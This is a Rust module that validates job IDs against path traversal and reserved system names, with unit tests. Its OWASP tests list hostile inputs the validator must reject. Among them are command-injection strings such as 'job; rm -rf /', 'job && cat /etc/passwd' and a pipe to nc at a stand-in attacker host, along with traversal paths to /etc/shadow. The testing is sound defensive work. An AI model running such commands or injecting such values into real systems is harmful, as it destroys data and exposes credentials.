//! Security Validation Utilities
//!
//! Provides additional validation utilities for security-sensitive operations.

use super::job_id::{JobId, JobIdError};
use std::collections::HashSet;

/// Security validator for job IDs and related operations
pub struct SecurityValidator {
    /// Set of blocked job ID patterns (e.g., reserved system names)
    blocked_patterns: HashSet<String>,
}

impl SecurityValidator {
    /// Create a new security validator with default blocked patterns
    pub fn new() -> Self {
        let mut blocked_patterns = HashSet::new();

        // Block common system directory names
        blocked_patterns.insert("tmp".to_string());
        blocked_patterns.insert("temp".to_string());
        blocked_patterns.insert("etc".to_string());
        blocked_patterns.insert("bin".to_string());
        blocked_patterns.insert("usr".to_string());
        blocked_patterns.insert("var".to_string());
        blocked_patterns.insert("root".to_string());
        blocked_patterns.insert("home".to_string());
        blocked_patterns.insert("sys".to_string());
        blocked_patterns.insert("proc".to_string());
        blocked_patterns.insert("dev".to_string());

        SecurityValidator { blocked_patterns }
    }

    /// Add a custom blocked pattern
    pub fn add_blocked_pattern(&mut self, pattern: impl Into<String>) {
        self.blocked_patterns.insert(pattern.into());
    }

    /// Validate a job ID with additional security checks
    pub fn validate_job_id(&self, id: impl AsRef<str>) -> Result<JobId, JobIdError> {
        let id_str = id.as_ref();

        // First perform standard validation
        let job_id = JobId::new(id_str)?;

        // Check against blocked patterns
        let lowercase_id = id_str.to_lowercase();
        if self.blocked_patterns.contains(&lowercase_id) {
            return Err(JobIdError::InvalidCharacters {
                invalid_chars: vec![], // Not technically invalid chars, but we reuse this error
            });
        }

        Ok(job_id)
    }

    /// Validate a batch of job IDs
    pub fn validate_job_ids(
        &self,
        ids: &[impl AsRef<str>],
    ) -> Result<Vec<JobId>, Vec<(usize, JobIdError)>> {
        let mut validated = Vec::with_capacity(ids.len());
        let mut errors = Vec::new();

        for (idx, id) in ids.iter().enumerate() {
            match self.validate_job_id(id) {
                Ok(job_id) => validated.push(job_id),
                Err(e) => errors.push((idx, e)),
            }
        }

        if errors.is_empty() {
            Ok(validated)
        } else {
            Err(errors)
        }
    }
}

impl Default for SecurityValidator {
    fn default() -> Self {
        Self::new()
    }
}

/// OWASP attack vector tests
#[cfg(test)]
mod owasp_tests {
    use super::*;

    #[test]
    fn test_path_traversal_vectors() {
        let validator = SecurityValidator::new();

        // Common path traversal patterns
        let attack_vectors = vec![
            "../etc/passwd",
            "../../etc/shadow",
            "./../config",
            ".../.../etc",
            "..\\windows\\system32",
            "%2e%2e%2f", // URL encoded
            "..%252f",   // Double URL encoded
        ];

        for vector in attack_vectors {
            assert!(
                validator.validate_job_id(vector).is_err(),
                "Failed to block path traversal: {}",
                vector
            );
        }
    }

    #[test]
    fn test_null_byte_injection() {
        let validator = SecurityValidator::new();

        let attack_vectors = vec!["job\0.txt", "job%00.txt", "job\x00test"];

        for vector in attack_vectors {
            assert!(
                validator.validate_job_id(vector).is_err(),
                "Failed to block null byte: {}",
                vector
            );
        }
    }

    #[test]
    fn test_command_injection() {
        let validator = SecurityValidator::new();

        let attack_vectors = vec![
            "job; rm -rf /",
            "job && cat /etc/passwd",
            "job | nc attacker.com 1234",
            "job`whoami`",
            "job$(whoami)",
        ];

        for vector in attack_vectors {
            assert!(
                validator.validate_job_id(vector).is_err(),
                "Failed to block command injection: {}",
                vector
            );
        }
    }

    #[test]
    fn test_directory_listing() {
        let validator = SecurityValidator::new();

        let attack_vectors = vec![".", "..", "./", "../"];

        for vector in attack_vectors {
            assert!(
                validator.validate_job_id(vector).is_err(),
                "Failed to block directory listing: {}",
                vector
            );
        }
    }

    #[test]
    fn test_unicode_normalization() {
        let validator = SecurityValidator::new();

        // Unicode characters that might normalize to dangerous sequences
        let attack_vectors = vec![
            "job\u{202E}toor", // Right-to-left override
            "job\u{FEFF}test", // Zero-width no-break space
        ];

        for vector in attack_vectors {
            // These contain control characters and should be blocked
            assert!(
                validator.validate_job_id(vector).is_err(),
                "Failed to block unicode attack: {}",
                vector
            );
        }
    }

    #[test]
    fn test_blocked_system_names() {
        let validator = SecurityValidator::new();

        let system_names = vec!["etc", "tmp", "root", "sys", "proc", "dev"];

        for name in system_names {
            assert!(
                validator.validate_job_id(name).is_err(),
                "Failed to block system directory: {}",
                name
            );
        }
    }

    #[test]
    fn test_valid_job_ids_pass() {
        let validator = SecurityValidator::new();

        let valid_ids = vec![
            "job-123",
            "data_ingestion_2024",
            "ABC-DEF-123",
            "user-workflow-v1",
        ];

        for id in valid_ids {
            assert!(
                validator.validate_job_id(id).is_ok(),
                "False positive blocking valid job ID: {}",
                id
            );
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validator_creation() {
        let validator = SecurityValidator::new();
        assert!(validator.blocked_patterns.contains("tmp"));
        assert!(validator.blocked_patterns.contains("etc"));
    }

    #[test]
    fn test_add_blocked_pattern() {
        let mut validator = SecurityValidator::new();
        validator.add_blocked_pattern("custom-blocked");

        assert!(validator.validate_job_id("custom-blocked").is_err());
    }

    #[test]
    fn test_validate_batch() {
        let validator = SecurityValidator::new();
        let ids = vec!["job-1", "job-2", "../attack"];

        let result = validator.validate_job_ids(&ids);
        assert!(result.is_err());

        let errors = result.unwrap_err();
        assert_eq!(errors.len(), 1);
        assert_eq!(errors[0].0, 2); // Third element
    }

    #[test]
    fn test_validate_batch_all_valid() {
        let validator = SecurityValidator::new();
        let ids = vec!["job-1", "job-2", "job-3"];

        let result = validator.validate_job_ids(&ids);
        assert!(result.is_ok());

        let validated = result.unwrap();
        assert_eq!(validated.len(), 3);
    }
}
